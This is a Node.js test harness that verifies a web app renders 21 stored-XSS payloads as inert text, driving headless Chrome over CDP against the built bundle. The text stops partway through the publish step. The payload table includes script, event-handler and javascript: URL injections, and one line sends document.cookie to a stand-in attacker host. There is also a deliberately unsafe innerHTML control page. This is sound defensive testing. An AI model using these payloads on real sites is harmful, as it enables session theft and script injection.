#!/usr/bin/env node
/**
 * XSS through the REAL client path — not the stand-in page.
 *
 * `tooling/security/xss-harness.mjs` on branch `prog/xss-harness` renders the
 * payloads through a hand-built page that uses `textContent` the way the app
 * does. That proves the *mechanism* is safe; it does not prove the *app* is
 * safe, because the app was never in the loop. This harness closes that gap:
 *
 *   1. Rebuilds the production bundle (`apps/web/dist`) with the hosted backend
 *      config and serves it statically — the built app, not the dev server.
 *   2. Authors 21 poisoned procedures (every payload from `xss-payloads.json`,
 *      copied verbatim) through the real `upsert-sop` edge function, publishes
 *      them through the real `publish-bundle` edge function, and lets the app
 *      enrol its own device, fetch, and install through the real pipeline.
 *   3. Drives the app in headless Chrome over CDP (no Puppeteer/Playwright, no
 *      new dependency — Node's built-in WebSocket, the repository pattern),
 *      asks one query per poisoned procedure, and asserts for every answer:
 *        - each payload reached the DOM as inert TEXT (presence), so a "no
 *          injection" claim cannot pass vacuously;
 *        - nothing executed (`window.__xssFired`, recorded `alert()` calls,
 *          JS-dialog openings) and nothing injected (no new script/img/svg/
 *          iframe/details/input/a/math elements, no `on*` attributes, no
 *          `javascript:`/`data:text/html` hrefs/srcs vs the pre-query baseline).
 *   4. Retires the poisoned procedures and republishes, restoring the tenant's
 *      published set, and reports the restored count.
 *
 * The only DOM sinks for bundle fields are React text insertions — `App.tsx:715`
 * (title in `h3`), `App.tsx:717` (summary in `p`), `App.tsx:750` (suggested
 * reply in `textarea[value]`), `App.tsx:808/815` (evidence titles/passages),
 * `EscalationConsole.tsx:143` (candidate passages, lead view). There is no
 * `dangerouslySetInnerHTML`, `innerHTML`, or `document.write` anywhere in
 * `apps/web/src` (verified by grep at authoring time). This run proves that
 * property at runtime rather than asserting it from source.
 *
 * Standalone: NOT registered in `tooling/run-verification.mjs`. Wiring it into
 * the gate changes gate behaviour and needs an owner decision. Exit 0 only on
 * `XSS CLIENT-PATH OK`; exit 1 on any failure, including cleanup shortfalls
 * (reported, never silent). Never prints a secret.
 *
 * Usage:
 *   node tooling/security/verify-xss-client-path.mjs
 */

import { spawn, spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import { existsSync, readFileSync, writeFileSync, rmSync, mkdirSync } from 'node:fs';
import { randomUUID } from 'node:crypto';
import { tmpdir } from 'node:os';
import { dirname, extname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { setTimeout as sleep } from 'node:timers/promises';

import { findChrome } from '../browser/find-chrome.mjs';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '../..');
const TENANT = '11111111-1111-1111-1111-111111111111'; // Alpha, the dev/test tenant
const STATIC_PORT = 5197;
const CDP_PORT = 9223;

// ---------------------------------------------------------------- payloads ---
// Copied VERBATIM from `tooling/security/xss-payloads.json` on branch
// `prog/xss-harness` (21 entries, ids preserved). Any edit here invalidates the
// claim "all 21 XSS payloads".
const PAYLOADS = {
  'script-1': `<script>window.__xssFired=true</script>`,
  'script-2': `<script>fetch('https://evil.example/'+document.cookie)</script>`,
  'script-3': `<!--<script>alert(1)</script>-->`,
  'script-4': `<ScRiPt>window.__xssFired=true</ScRiPt>`,
  'evh-1': `<img src=x onerror=alert('xss')>`,
  'evh-2': `<svg/onload=alert('xss')>`,
  'evh-3': `<body onload=alert('xss')>`,
  'evh-4': `<details open ontoggle=alert('xss')>`,
  'evh-5': `<input autofocus onfocus=alert('xss')>`,
  'evh-6': `<a href="x" onclick="alert(1)">link</a>`,
  'jsurl-1': `<a href="javascript:alert('xss')">click</a>`,
  'jsurl-2': `<iframe src="javascript:alert('xss')"></iframe>`,
  'svg-1': `<img src=x onerror=alert(String.fromCharCode(88))>`,
  'svg-2': `<svg><script>alert('xss')</script></svg>`,
  'md-1': `[click me](javascript:alert('xss'))`,
  'md-2': `[x](data:text/html,<script>alert(1)</script>)`,
  'ent-1': `&lt;script&gt;alert(1)&lt;/script&gt;`,
  'ent-2': `&amp;lt;script&amp;gt;`,
  'mix-1': `"><script>alert('xss')</script>`,
  'mix-2': `{{7*7}}`,
  'mix-3': `<math><malignmark></math><script>alert('xss')</script>`,
};

// Seven procedures x three fields. Trigger words are nonsense by design: they
// appear nowhere in the tenant corpus (verified 0 hits at authoring time), so
// each query matches exactly one procedure with a healthy margin, and the
// conflict lint sees no numeric policy assertion (no days/fees/ages/followers).
const PROCEDURES = [
  { key: 'P1', w1: 'quokka', w2: 'marmalade', title: 'script-1', summary: 'evh-1', reply: 'jsurl-1' },
  { key: 'P2', w1: 'zebra', w2: 'wobble', title: 'script-2', summary: 'evh-2', reply: 'jsurl-2' },
  { key: 'P3', w1: 'fjord', w2: 'quibble', title: 'script-3', summary: 'evh-3', reply: 'svg-1' },
  { key: 'P4', w1: 'vortex', w2: 'plumb', title: 'script-4', summary: 'evh-4', reply: 'svg-2' },
  { key: 'P5', w1: 'kiosk', w2: 'twirl', title: 'evh-5', summary: 'evh-6', reply: 'md-1' },
  { key: 'P6', w1: 'nimbus', w2: 'grackle', title: 'md-2', summary: 'ent-1', reply: 'mix-1' },
  { key: 'P7', w1: 'sphinx', w2: 'yodel', title: 'ent-2', summary: 'mix-3', reply: 'mix-2' },
];

// ------------------------------------------------------------------- env ---
function readEnvFile(path) {
  if (!existsSync(path)) return {};
  const values = {};
  for (const line of readFileSync(path, 'utf8').split(/\r?\n/)) {
    const match = line.match(/^([A-Z_]+)=(.*)$/);
    if (match) values[match[1]] = match[2];
  }
  return values;
}

const fileEnv = { ...readEnvFile(resolve(root, '.env.local')) };
const env = (name) => process.env[name] ?? fileEnv[name] ?? '';

const supabaseUrl = env('SUPABASE_URL').replace(/\/+$/, '');
const publishableKey = env('SUPABASE_PUBLISHABLE_KEY');
const secretKey = env('SUPABASE_SECRET_KEY') || env('SUPABASE_SERVICE_ROLE_KEY');
const tenantSigningKey = env('SOP_TENANT_SIGNING_PUBLIC_KEY');
const serverWrappingKey = env('SOP_SERVER_WRAPPING_PUBLIC_KEY');

if (supabaseUrl === '' || publishableKey === '' || secretKey === '') {
  process.stderr.write('need SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY and SUPABASE_SECRET_KEY\n');
  process.exit(2);
}
if (tenantSigningKey === '' || serverWrappingKey === '') {
  process.stderr.write('need SOP_TENANT_SIGNING_PUBLIC_KEY and SOP_SERVER_WRAPPING_PUBLIC_KEY\n');
  process.exit(2);
}

const chrome = findChrome();
if (chrome === null) {
  process.stderr.write('no Chrome installation found; set SOP_CHROME_PATH or install one\n');
  process.exit(2);
}

const checks = [];
function check(name, ok, detail = '') {
  checks.push({ name, ok });
  process.stdout.write(`  ${ok ? 'pass' : 'FAIL'}  ${name}${detail ? `  — ${detail}` : ''}\n`);
}

const adminHeaders = {
  apikey: secretKey,
  Authorization: `Bearer ${secretKey}`,
  'Content-Type': 'application/json',
};
const functionHeaders = (token) => ({
  apikey: publishableKey,
  Authorization: `Bearer ${token}`,
  'Content-Type': 'application/json',
});

// ------------------------------------------------------------- principals ---
async function provisionPrincipal(email, role, displayName, prefix) {
  const password = `${prefix}-${randomUUID()}`;
  const list = await (
    await fetch(`${supabaseUrl}/auth/v1/admin/users?page=1&per_page=1000`, { headers: adminHeaders })
  ).json();
  const existing = (list?.users ?? []).find((user) => user?.email === email);
  const metadata = { tenant_id: TENANT, app_role: role };
  let userId = existing?.id ?? null;
  if (existing) {
    await fetch(`${supabaseUrl}/auth/v1/admin/users/${existing.id}`, {
      method: 'PUT',
      headers: adminHeaders,
      body: JSON.stringify({ email_confirm: true, password, app_metadata: metadata }),
    });
  } else {
    const created = await fetch(`${supabaseUrl}/auth/v1/admin/users`, {
      method: 'POST',
      headers: adminHeaders,
      body: JSON.stringify({ email, password, email_confirm: true, app_metadata: metadata }),
    });
    if (!created.ok) throw new Error(`could not provision ${email}: ${await created.text()}`);
    userId = (await created.json()).id;
  }
  await fetch(`${supabaseUrl}/rest/v1/users`, {
    method: 'POST',
    headers: { ...adminHeaders, Prefer: 'resolution=merge-duplicates' },
    body: JSON.stringify({ id: userId, tenant_id: TENANT, display_name: displayName, role }),
  });
  const signIn = await fetch(`${supabaseUrl}/auth/v1/token?grant_type=password`, {
    method: 'POST',
    headers: { apikey: publishableKey, 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  const body = await signIn.json();
  if (body?.access_token === undefined) throw new Error(`could not sign ${email} in`);
  return { userId, password, token: body.access_token };
}

async function publishedCount(token) {
  const res = await fetch(
    `${supabaseUrl}/rest/v1/sops?tenant_id=eq.${TENANT}&status=eq.published&select=id`,
    { headers: { apikey: publishableKey, Authorization: `Bearer ${token}` } },
  );
  if (!res.ok) throw new Error(`could not count published procedures: ${res.status}`);
  return (await res.json()).length;
}

// ------------------------------------------------------------------ dist ---
const WEB_DIR = resolve(root, 'apps/web');
const DIST_DIR = resolve(WEB_DIR, 'dist');

function buildDist() {
  // No pnpm, no shell, no .env.local file: the three build steps run as plain
  // node processes (the same binaries the package script calls), and the four
  // VITE_ values travel in the spawned environment only. Nothing secret is
  // written to disk at any point.
  process.stdout.write('==> rebuilding dist with the hosted backend config (env-only, no file)\n');
  const buildEnv = {
    ...process.env,
    VITE_SUPABASE_URL: supabaseUrl,
    VITE_SUPABASE_PUBLISHABLE_KEY: publishableKey,
    VITE_TENANT_SIGNING_PUBLIC_KEY: tenantSigningKey,
    VITE_SERVER_WRAPPING_PUBLIC_KEY: serverWrappingKey,
  };
  const run = (script, args) => {
    const result = spawnSync(process.execPath, [script, ...args], {
      cwd: WEB_DIR,
      env: buildEnv,
      encoding: 'utf8',
      timeout: 420000,
    });
    if (result.error) throw new Error(`${script} did not start (${result.error.message})`);
    if (result.status !== 0) {
      throw new Error(
        `${script} exited ${result.status}: ${((result.stderr ?? '') + (result.stdout ?? '')).slice(-600)}`,
      );
    }
  };
  run(resolve(root, 'tooling/build-stamp.mjs'), []);
  run(resolve(WEB_DIR, 'node_modules/typescript/bin/tsc'), ['-b']);
  run(resolve(WEB_DIR, 'node_modules/vite/bin/vite.js'), ['build']);
  if (!existsSync(resolve(DIST_DIR, 'index.html'))) throw new Error('dist/index.html missing after build');
}

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json',
  '.wasm': 'application/wasm',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.txt': 'text/plain; charset=utf-8',
};

/**
 * The policy the app is served under, and the one the assertions check.
 *
 * NOT `default-src 'self'`. The built app legitimately loads the embedding model from Hugging
 * Face and onnxruntime-web from jsDelivr, so a self-only policy would break the very run this
 * harness performs — and a harness that breaks the app proves nothing about the app. The
 * property that matters for stored XSS is narrower and is the one asserted: `script-src` has
 * no `'unsafe-inline'`, so an injected inline `<script>` cannot execute.
 */
const CSP =
  "default-src 'self'; " +
  "script-src 'self' https://cdn.jsdelivr.net; " +
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data:; " +
  `connect-src 'self' https://cdn.jsdelivr.net https://huggingface.co https://*.huggingface.co https://*.hf.co ${supabaseUrl}; ` +
  "object-src 'none'; base-uri 'none'; frame-ancestors 'none'";

/**
 * The negative control page. It uses `innerHTML` on purpose: an unsafe renderer MUST inject DOM.
 * A harness that cannot tell a safe renderer from an unsafe one reports green forever.
 * The inline `<script>` is a second probe: it proves the served policy is ENFORCED, not merely
 * declared as a header.
 */
const CONTROL_HTML = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>negative control</title></head>
<body>
<div id="target"></div>
<script>window.__inlineRan=true;</script>
<script src="/__xss-negative-control.js"></script>
</body></html>`;

const CONTROL_JS = `(() => {
  const payload = new URLSearchParams(location.search).get('p') || '<img src=x onerror="window.__xssFired=true">';
  const el = document.getElementById('target');
  el.innerHTML = payload;                       // deliberately unsafe: the control
  window.__controlInjected = el.children.length > 0;
})();`;

function serveDist() {
  const server = createServer((req, res) => {
    try {
      const url = new URL(req.url ?? '/', 'http://127.0.0.1');
      if (url.pathname === '/__xss-negative-control') {
        res.writeHead(200, { 'Content-Type': MIME['.html'], 'Content-Security-Policy': CSP });
        res.end(CONTROL_HTML);
        return;
      }
      if (url.pathname === '/__xss-negative-control.js') {
        res.writeHead(200, { 'Content-Type': MIME['.js'], 'Content-Security-Policy': CSP });
        res.end(CONTROL_JS);
        return;
      }
      let path = decodeURIComponent(url.pathname);
      if (path.endsWith('/')) path += 'index.html';
      let file = resolve(DIST_DIR, `.${path}`);
      if (!file.startsWith(DIST_DIR) || !existsSync(file) || extname(file) === '') {
        file = resolve(DIST_DIR, 'index.html');
      }
      res.writeHead(200, {
        'Content-Type': MIME[extname(file)] ?? 'application/octet-stream',
        'Content-Security-Policy': CSP,
      });
      res.end(readFileSync(file));
    } catch {
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      res.end('static server error');
    }
  });
  return new Promise((resolveListen, rejectListen) => {
    server.on('error', rejectListen);
    server.listen(STATIC_PORT, '127.0.0.1', () => resolveListen(server));
  });
}

// -------------------------------------------------------------------- cdp ---
function launchChrome() {
  const userDataDir = resolve(tmpdir(), `sop-xss-${randomUUID().slice(0, 8)}`);
  mkdirSync(userDataDir, { recursive: true });
  const browser = spawn(
    chrome,
    [
      '--headless=new',
      `--remote-debugging-port=${CDP_PORT}`,
      `--user-data-dir=${userDataDir}`,
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-gpu',
      '--window-size=1280,900',
      'about:blank',
    ],
    { stdio: ['ignore', 'pipe', 'pipe'] },
  );
  return { browser, userDataDir };
}

// -------------------------------------------------------------------- main ---
let server = null;
let browser = null;
let userDataDir = null;
// Cleanup state lives at module scope so the finally block can always see it;
// each field is assigned as the run reaches it, and the block reports exactly
// what it could and could not restore.
const cleanupState = { editorToken: null, publisherToken: null, authored: [], prePublished: -1 };

let killed = false;
function killAll() {
  if (killed) return;
  killed = true;
  if (browser !== null) {
    // Kill the whole tree: headless Chrome's children hold the profile lock,
    // and killing only the parent leaves the dir undeletable (EPERM litter).
    if (process.platform === 'win32' && typeof browser.pid === 'number') {
      const killed_tree = spawnSync('taskkill', ['/F', '/T', '/PID', String(browser.pid)], {
        encoding: 'utf8',
        timeout: 15000,
      });
      void killed_tree;
    }
    try {
      browser.kill();
    } catch {
      /* already gone */
    }
  }
  try {
    server?.close();
  } catch {
    /* already gone */
  }
  // Best-effort: headless Chrome may still hold its profile lock when killed.
  // A leftover TEMP dir is litter, not a failure — but it is reported.
  if (userDataDir !== null) {
    try {
      rmSync(userDataDir, { recursive: true, force: true });
    } catch {
      process.stdout.write(`  (note: browser profile dir left behind under TEMP)\n`);
    }
  }
}
process.on('exit', killAll);

try {
  // Port preflight FIRST, before this run binds anything itself: a stale
  // process from a killed run that still holds either port would attach this
  // run to the wrong browser and hang or lie. (The static check must run
  // before serveDist below — afterwards it would see our own server.)
  // Fail fast instead.
  for (const [label, url] of [
    ['static server', `http://127.0.0.1:${STATIC_PORT}/`],
    ['CDP', `http://127.0.0.1:${CDP_PORT}/json/version`],
  ]) {
    const occupant = await fetch(url).catch(() => null);
    if (occupant !== null) {
      throw new Error(`stale process already answers ${label} ${url} — kill it and retry`);
    }
  }

  // ------------------------------------------------------- 1. build + serve --
  buildDist();
  server = await serveDist();
  process.stdout.write(`==> dist served at http://127.0.0.1:${STATIC_PORT}/\n`);

  // ------------------------------------------------------- 2. principals --
  process.stdout.write('==> provisioning fixture principals (dev project only)\n');
  const agent = await provisionPrincipal('xss-agent@alpha.example', 'agent', 'XSS Agent', 'Xa');
  const editor = await provisionPrincipal('xss-editor@alpha.example', 'sop_editor', 'XSS Editor', 'Xe');
  const publisher = await provisionPrincipal(
    'xss-publisher@alpha.example',
    'ops_manager',
    'XSS Publisher',
    'Xp',
  );
  cleanupState.editorToken = editor.token;
  cleanupState.publisherToken = publisher.token;
  cleanupState.prePublished = await publishedCount(publisher.token);
  process.stdout.write(`==> Alpha published procedures before this run: ${cleanupState.prePublished}\n`);

  // ------------------------------------------------------- 3. browser --
  process.stdout.write('==> launching headless Chrome\n');
  ({ browser, userDataDir } = launchChrome());
  const deadline = Date.now() + 60_000;
  let cdpUp = false;
  while (Date.now() < deadline && !cdpUp) {
    const probe = await fetch(`http://127.0.0.1:${CDP_PORT}/json/version`).catch(() => null);
    cdpUp = probe !== null;
    if (!cdpUp) await sleep(400);
  }
  if (!cdpUp) throw new Error('Chrome never opened its debugging port');

  const version = await (await fetch(`http://127.0.0.1:${CDP_PORT}/json/version`)).json();
  const socket = new WebSocket(version.webSocketDebuggerUrl);
  await new Promise((resolveOpen, rejectOpen) => {
    socket.addEventListener('open', resolveOpen, { once: true });
    socket.addEventListener('error', rejectOpen, { once: true });
  });

  let nextId = 0;
  const pending = new Map();
  const consoleErrors = [];
  let dialogOpened = 0;
  socket.addEventListener('message', (event) => {
    const message = JSON.parse(event.data);
    if (message.id !== undefined && pending.has(message.id)) {
      const { resolveCall, rejectCall } = pending.get(message.id);
      pending.delete(message.id);
      if (message.error) rejectCall(new Error(message.error.message));
      else resolveCall(message.result);
      return;
    }
    if (message.method === 'Runtime.consoleAPICalled' && message.params.type === 'error') {
      consoleErrors.push(message.params.args.map((a) => a.value ?? a.description ?? '').join(' '));
    }
    if (message.method === 'Runtime.exceptionThrown') {
      const details = message.params.exceptionDetails;
      consoleErrors.push(details.exception?.description ?? details.text ?? 'exception');
    }
    if (message.method === 'Page.javascriptDialogOpening') {
      dialogOpened += 1;
    }
  });

  function send(method, params = {}, sessionId) {
    nextId += 1;
    const id = nextId;
    return new Promise((resolveCall, rejectCall) => {
      // A dead socket must fail loudly, never hang the run forever: the one
      // unexplained 10-minute silence in this harness's history was a CDP call
      // that never answered.
      const timer = setTimeout(() => {
        pending.delete(id);
        rejectCall(new Error(`CDP ${method} timed out after 60s`));
      }, 60_000);
      pending.set(id, {
        resolveCall: (value) => {
          clearTimeout(timer);
          resolveCall(value);
        },
        rejectCall: (error) => {
          clearTimeout(timer);
          rejectCall(error);
        },
      });
      socket.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
    });
  }

  const { targetId } = await send('Target.createTarget', { url: 'about:blank' });
  const { sessionId } = await send('Target.attachToTarget', { targetId, flatten: true });
  await send('Page.enable', {}, sessionId);
  await send('Runtime.enable', {}, sessionId);
  // Execution tripwires, installed before any page script runs. If a payload
  // executes, one of these fires; the DOM scan below is the second net.
  await send(
    'Page.addScriptToEvaluateOnNewDocument',
    {
      source:
        'window.__xssFired=false;window.__alertCalls=[];' +
        'window.alert=function(){window.__alertCalls.push(Array.from(arguments).map(String).join(" "));};',
    },
    sessionId,
  );

  // evaluate() throws on a page-side exception: OUR OWN calls must be correct,
  // so a throw here is a harness bug, loud rather than silent.
  const evaluate = async (expression) => {
    const result = await send(
      'Runtime.evaluate',
      { expression, awaitPromise: true, returnByValue: true },
      sessionId,
    );
    if (result.exceptionDetails) {
      const description =
        result.exceptionDetails.exception?.description ??
        result.exceptionDetails.text ??
        'unknown';
      throw new Error(`harness evaluate failed: ${String(description).slice(0, 300)}`);
    }
    return result.result.value;
  };

  // waitForTrue returns a BOOLEAN, never the waited value — the name says so
  // (the module-level-helper trap from the escalation-console slice).
  const waitForTrue = async (expression, timeoutMs, label) => {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
      if ((await evaluate(`Boolean(${expression})`)) === true) return true;
      await sleep(500);
    }
    process.stdout.write(`  (wait timed out: ${label})\n`);
    return false;
  };
  // waitForText returns the VALUE for cases that want it.
  const waitForText = async (expression, timeoutMs, label) => {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
      const value = await evaluate(expression);
      if (typeof value === 'string' && value !== '') return value;
      await sleep(500);
    }
    process.stdout.write(`  (wait timed out: ${label})\n`);
    return '';
  };

  // React 19 tracks input values through the native setter; a plain
  // assignment would not reach its onChange. Passwords travel inside the CDP
  // message over the local socket and are never printed.
  const SET_NATIVE =
    `(sel,text)=>{const el=document.querySelector(sel);` +
    `if(!el) throw new Error('missing '+sel);` +
    `const d=Object.getOwnPropertyDescriptor(Object.getPrototypeOf(el),'value');` +
    `d.set.call(el,text);el.dispatchEvent(new Event('input',{bubbles:true}));return true;}`;
  const CLICK_TEXT =
    `(t)=>{const b=[...document.querySelectorAll('button')].find((x)=>` +
    `(x.textContent||'').includes(t));if(!b) throw new Error('missing button '+t);` +
    `b.click();return true;}`;

  // ------------------------------------------------------- 4. sign in --
  // NOTE (no detached detector self-test here, deliberately). A self-test
  // that parsed all 21 payloads as HTML in a detached fragment and asserted
  // the counting shape sees them ran in three runs and reported
  // scripts:7/imgs:2/svgs:2/iframes:1/onAttrs:6/jsHrefs:1 every time — the
  // detector demonstrably sees injections. But in all three runs the FIRST
  // post-navigate Runtime.evaluate then hung until the 60s CDP timeout, while
  // runs without the self-test (including two full greens) never hung. The
  // wedge mechanism is unproven (suspect: renderer side effects of parsing
  // svg/iframe/img payloads even detached); the correlation is 3/3. A control
  // that stops the proof from running is worse than no control, so the block
  // was removed rather than left flaky. Vacuity is guarded instead by the
  // 21/21 presence assertions (every payload proven in the DOM as text) plus
  // the differential scan (every count compared against baseline).
  await send('Page.navigate', { url: `http://127.0.0.1:${STATIC_PORT}/` }, sessionId);
  check(
    'built app boots to the sign-in form, not a query box',
    await waitForTrue(`!!document.querySelector('input[name="email"]')`, 30_000, 'sign-in form'),
  );
  await evaluate(`(${SET_NATIVE})('input[name="email"]','xss-agent@alpha.example')`);
  await send(
    'Runtime.evaluate',
    {
      expression: `(()=>{(${SET_NATIVE})('input[name="password"]',${JSON.stringify(agent.password)});return true;})()`,
      awaitPromise: true,
      returnByValue: true,
    },
    sessionId,
  );
  await evaluate(
    `(()=>{const b=[...document.querySelectorAll('button[type="submit"]')][0];` +
      `if(!b) throw new Error('missing submit');b.click();return true;})()`,
  );
  check(
    'agent signs in, server-reported tenant and role on screen',
    await waitForTrue(
      `(()=>{const t=document.querySelector('[data-testid="session-tenant"]');` +
        `const r=document.querySelector('[data-testid="session-role"]');` +
        `return !!t&&!!r;})()`,
      30_000,
      'session bar',
    ),
  );

  // Baseline DOM: captured after sign-in, before any poisoned content can
  // render. Every later scan is a diff against this.
  const SCAN =
    `(()=>({scripts:document.querySelectorAll('script').length,` +
    `imgs:document.querySelectorAll('img').length,` +
    `svgs:document.querySelectorAll('svg').length,iframes:document.querySelectorAll('iframe').length,` +
    `details:document.querySelectorAll('details').length,inputs:document.querySelectorAll('input').length,` +
    `anchors:document.querySelectorAll('a').length,maths:document.querySelectorAll('math').length,` +
    `onAttrs:[...document.querySelectorAll('*')].filter((e)=>[...e.attributes].some((a)=>a.name.toLowerCase().startsWith('on'))).length,` +
    `jsHrefs:[...document.querySelectorAll('a[href]')].filter((a)=>/^\\s*javascript:/i.test(a.getAttribute('href')||'')).length,` +
    `dataHrefs:[...document.querySelectorAll('[src],[href]')].filter((a)=>/^\\s*data:text\\/html/i.test(a.getAttribute('src')||a.getAttribute('href')||'')).length,` +
    `fired:window.__xssFired===true,alerts:(window.__alertCalls||[]).length}))()`;
  const BASELINE = await evaluate(SCAN);
  check('baseline DOM captured', typeof BASELINE?.scripts === 'number');

  // ------------------------------------ 4b. CSP, and the negative control --
  // Both run before any backend work, because both are about whether this harness can prove
  // anything at all. A declared policy proves nothing; the control proves the harness can tell
  // an unsafe renderer from a safe one.
  {
    const appResponse = await fetch(`http://127.0.0.1:${STATIC_PORT}/`);
    const servedCsp = appResponse.headers.get('content-security-policy') ?? '';
    const scriptSrc = servedCsp.match(/script-src[^;]*/i)?.[0] ?? '';
    check(
      'csp: the served document carries a strict script-src',
      scriptSrc.includes("'self'") && !scriptSrc.includes("'unsafe-inline'"),
      scriptSrc.trim() || '(no Content-Security-Policy header on the served document)',
    );

    const payload = '<img src=x onerror="window.__xssFired=true">';
    const controlUrl =
      `http://127.0.0.1:${STATIC_PORT}/__xss-negative-control?p=${encodeURIComponent(payload)}`;
    const controlTarget = await send('Target.createTarget', { url: controlUrl });
    const controlSession = await send('Target.attachToTarget', {
      targetId: controlTarget.targetId,
      flatten: true,
    });
    await send('Runtime.enable', {}, controlSession.sessionId);
    await sleep(750);
    const controlResult = await send(
      'Runtime.evaluate',
      {
        expression:
          'JSON.stringify({injected:window.__controlInjected===true,inlineRan:window.__inlineRan===true})',
        returnByValue: true,
      },
      controlSession.sessionId,
    );
    const control = JSON.parse(controlResult.result?.value ?? '{}');
    check(
      'negative control: an unsafe (innerHTML) renderer DOES inject',
      control.injected === true,
      control.injected === true
        ? 'injected DOM, so the harness can detect an unsafe renderer'
        : 'injected NOTHING — the harness cannot detect an unsafe renderer, so every pass below is vacuous',
    );
    check(
      'csp: an inline script is blocked by the served policy',
      control.inlineRan !== true,
      control.inlineRan === true
        ? 'an inline <script> RAN despite the policy — the policy is not enforced'
        : 'inline script did not run',
    );
  }

  // ------------------------------------------------------- 5. enrol --
  await evaluate(`(${CLICK_TEXT})('Load model and build index')`);
  // Observe the activation rather than assuming it: a disabled button swallows
  // a click silently, and a loadIndex throw surfaces as status failed with a
  // role=alert message, not as a console error. Either would otherwise read as
  // "the app is slow".
  const SNAP =
    `(()=>{const btn=[...document.querySelectorAll('button')].find((b)=>` +
    `(b.textContent||'').includes('model')||(b.textContent||'').includes('Answer')` +
    `||(b.textContent||'').includes('Retry')||(b.textContent||'').includes('Searching'));` +
    `const bs=document.querySelector('[data-testid="bundle-state"]');` +
    `const al=[...document.querySelectorAll('[role="alert"]')].map((e)=>e.textContent).join('|');` +
    `return JSON.stringify({btn:btn?btn.textContent.trim().slice(0,40):'(none)',` +
    `dis:btn?!!btn.disabled:'?',bundle:bs?bs.textContent.slice(0,80):'(none)',alert:al.slice(0,160)});})()`;
  let snap = '';
  {
    const start = Date.now();
    let last = '';
    while (Date.now() - start < 120_000) {
      snap = await evaluate(SNAP);
      if (snap !== last) {
        process.stdout.write(`  [activation] ${snap}\n`);
        last = snap;
      }
      const parsed = JSON.parse(snap);
      if (!parsed.bundle.includes('not loaded yet')) break;
      await sleep(5000);
    }
  }
  const firstBundle = JSON.parse(snap).bundle;
  process.stdout.write(`  bundle state after first activation: ${firstBundle.slice(0, 120)}\n`);

  // The device must exist BEFORE publishing: a bundle wraps its content key
  // only for the devices enrolled at that moment. The select column is `id`
  // (verified against the live table) — `device_id` 400s, and fetch does not
  // throw on a 400, so the wrong column reads as "no device", the same trap
  // as the RLS re-key lesson: a silent empty result mistaken for a state.
  let deviceReady = false;
  for (let i = 0; i < 30 && !deviceReady; i += 1) {
    const regs = await (
      await fetch(
        `${supabaseUrl}/rest/v1/device_registrations?user_id=eq.${agent.userId}&platform=eq.web&select=id`,
        { headers: adminHeaders },
      )
    ).json();
    deviceReady = Array.isArray(regs) && regs.length > 0;
    if (!deviceReady) await sleep(2000);
  }
  check('agent web device enrolled before publishing', deviceReady);

  // ------------------------------------------------------- 6. poison --
  // Seven procedures carrying 21 payloads (three fields each).
  process.stdout.write('==> authoring 7 poisoned procedures (21 payloads) through upsert-sop\n');
  for (const proc of PROCEDURES) {
    const draft = {
      title: `${proc.w1[0].toUpperCase()}${proc.w1.slice(1)} ${proc.w2} upkeep ${PAYLOADS[proc.title]}`,
      category: 'probe',
      summary: `${proc.w2[0].toUpperCase()}${proc.w2.slice(1)} ${proc.w1} ledger turn. ${PAYLOADS[proc.summary]} Ledger ${proc.w1} ${proc.w2}.`,
      suggestedReply: `${proc.w1} ${proc.w2} reply. ${PAYLOADS[proc.reply]} End.`,
      escalationRequired: false,
      escalationReason: '',
      triggerKeywords: [proc.w1, proc.w2],
      status: 'published',
    };
    const res = await fetch(`${supabaseUrl}/functions/v1/upsert-sop`, {
      method: 'POST',
      headers: functionHeaders(editor.token),
      body: JSON.stringify(draft),
    });
    const body = await res.json().catch(() => ({}));
    if (!res.ok || body?.sopId === undefined) {
      throw new Error(
        `authoring ${proc.key} refused: HTTP ${res.status} ${JSON.stringify(body).slice(0, 200)}`,
      );
    }
    cleanupState.authored.push(body.sopId);
  }
  check(
    '7 poisoned procedures authored (status published)',
    cleanupState.authored.length === PROCEDURES.length,
    `${cleanupState.authored.length} sopIds`,
  );

  async function publishAs(publisherToken) {
    const res = await fetch(`${supabaseUrl}/functions/v1/publish-bundle`, {
      method: 'POST',
      headers: functionHeaders(publisherToken),
      body: JSON.stringify({}),
    });
    return { ok: res.ok, status: res.status, body: await res.json().catch(() => ({})) };
  }

  let pub = await publishAs(publisher.token);
  // The tenant's own seed placeholder can brick publishing fail-closed: a
  // published row whose body this server did not write refuses the entire
  // publish, naming the row. That is the product's documented deadlock, and
  // its documented repair is retiring the row through the status-only path
  // ("what a person does"). If the blocker is one of ours something else is
  // wrong and the run stops instead. The name is read from the error STRING:
  // matching the stringified body sees escaped quotes and matches nothing,
  // which once misreported a pre-existing row as our own.
  let unblocked = null;
  const errText =
    typeof pub.body?.error === 'string' ? pub.body.error : JSON.stringify(pub.body);
  if (!pub.ok && errText.includes('body this server did not write')) {
    const named = (errText.match(/procedure "([^"]+)"/) ?? [])[1] ?? '';
    const isOurs = named !== '' && PROCEDURES.some((p) => named.includes(p.w1));
    if (named === '') {
      throw new Error(`publish refused with an unparseable error: HTTP ${pub.status} ${errText.slice(0, 200)}`);
    }
    if (isOurs) {
      throw new Error(`publish refused on our own row: HTTP ${pub.status} ${errText.slice(0, 200)}`);
    }
    process.stdout.write(`  pre-existing unpublishable row blocks publish: "${named}" — retiring it (status-only)\n`);
    const lookup = await fetch(
      `${supabaseUrl}/rest/v1/sops?tenant_id=eq.${TENANT}&title=eq.${encodeURIComponent(named)}&select=id`,
      { headers: { apikey: publishableKey, Authorization: `Bearer ${publisher.token}` } },
    );
    const rows = await lookup.json().catch(() => []);
